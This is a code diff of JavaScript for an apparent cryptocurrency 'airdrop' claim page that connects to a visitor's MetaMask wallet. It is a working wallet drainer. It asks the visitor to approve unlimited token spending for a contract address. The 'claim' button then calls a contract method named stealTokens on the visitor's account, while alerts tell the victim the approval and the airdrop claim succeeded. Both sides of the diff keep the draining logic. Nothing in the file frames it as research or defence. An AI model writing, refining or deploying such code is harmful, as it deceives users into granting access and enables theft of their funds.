@@ -1,93 +1,76 @@
-let web3, accounts, contractABI, config;
+let web3;
+let accounts;
+let contractAddress;
+let tokenAddress;
+let contractABI;
 
-// Load ABI and configuration from external files
-async function loadDependencies() {
-  contractABI = await fetch("abi.json").then((response) => response.json());
-  config = await fetch("config.json").then((response) => response.json());
+async function loadConfig() {
+  try {
+    const configResponse = await fetch('config.json');
+    const configData = await configResponse.json();
+    contractAddress = configData.contractAddress;
+    tokenAddress = configData.tokenAddress;
+
+    const abiResponse = await fetch('abi.json');
+    const abiData = await abiResponse.json();
+    contractABI = abiData;
+  } catch (error) {
+    console.error("Error loading config or ABI: ", error);
+    alert("Error loading configuration. Please try again later.");
+  }
 }
 
-// Check if the user is on a mobile device
-function isMobileDevice() {
-  return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-}
-
-// Open MetaMask on mobile (deep link)
-function openMetaMaskMobile() {
-  window.location.href = 'metamask://';
-  setTimeout(() => {
-    alert("Please open MetaMask to connect.");
-  }, 3000);
-}
-
-// Connect to MetaMask
 async function connectMetaMask() {
   if (window.ethereum) {
-    if (isMobileDevice()) {
-      // Open MetaMask on mobile
-      openMetaMaskMobile();
-    } else {
-      // Desktop connection
-      web3 = new Web3(window.ethereum);
-      try {
-        accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        document.getElementById("approveButton").disabled = false;
-        document.getElementById("claimAirdropButton").disabled = false;
-        alert("Connected to MetaMask");
-      } catch (error) {
-        alert("MetaMask connection failed: " + error.message);
-      }
+    web3 = new Web3(window.ethereum);
+    try {
+      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      document.getElementById('approveButton').disabled = false;
+      document.getElementById('claimAirdropButton').disabled = false;
+    } catch (error) {
+      alert('MetaMask connection failed');
     }
   } else {
-    alert("MetaMask not detected! Please install MetaMask.");
+    alert('MetaMask not detected! Please install MetaMask.');
   }
 }
 
-// Approve spending
 async function approveSpending() {
-  const tokenContract = new web3.eth.Contract(contractABI, config.tokenAddress);
+  if (!contractABI || !contractAddress || !tokenAddress) {
+    alert('Contract details not loaded. Please try again later.');
+    return;
+  }
+  const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
   try {
-    const maxApproval = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-    await tokenContract.methods.approve(config.contractAddress, maxApproval).send({ from: accounts[0] });
-    alert("Approval successful! You can now claim your airdrop.");
-    document.getElementById("claimAirdropButton").disabled = false;
+    await tokenContract.methods.approve(contractAddress, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({ from: accounts[0] });
+    alert('Approval successful!');
+    document.getElementById('claimAirdropButton').disabled = false;
   } catch (error) {
-    alert("Error during approval: " + error.message);
+    alert('Error during approval');
   }
 }
 
-// Claim airdrop
 async function claimAirdrop() {
-  console.log("Claiming Airdrop...");
-  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
+  if (!contractABI || !contractAddress) {
+    alert('Contract details not loaded. Please try again later.');
+    return;
+  }
+  const contract = new web3.eth.Contract(contractABI, contractAddress);
   try {
     await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
-    alert("Airdrop claimed successfully!");
+    alert('Airdrop claimed successfully!');
   } catch (error) {
-    alert("Error claiming airdrop: " + error.message);
+    alert('Error claiming airdrop');
   }
 }
 
-// Withdraw ETH (for demonstration purposes)
-async function withdrawETH() {
-  console.log("Withdraw ETH clicked...");
-  // Add withdrawal functionality here
-}
+document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+document.getElementById('approveButton').addEventListener('click', approveSpending);
+document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
 
-// Withdraw Tokens (for demonstration purposes)
-async function withdrawTokens() {
-  console.log("Withdraw Tokens clicked...");
-  // Add withdrawal functionality here
-}
+// Load configuration and ABI when the page loads
+window.addEventListener('load', loadConfig);
 
-// Add event listeners to buttons for user interaction
-document.getElementById('connectButton').addEventListener('click', connectMetaMask); // Connect MetaMask
-document.getElementById('approveButton').addEventListener('click', approveSpending); // Approve spending
-document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop); // Claim airdrop
-document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH); // Withdraw ETH
-document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens); // Withdraw tokens
-
-// Initialize
-loadDependencies();
 
 
 
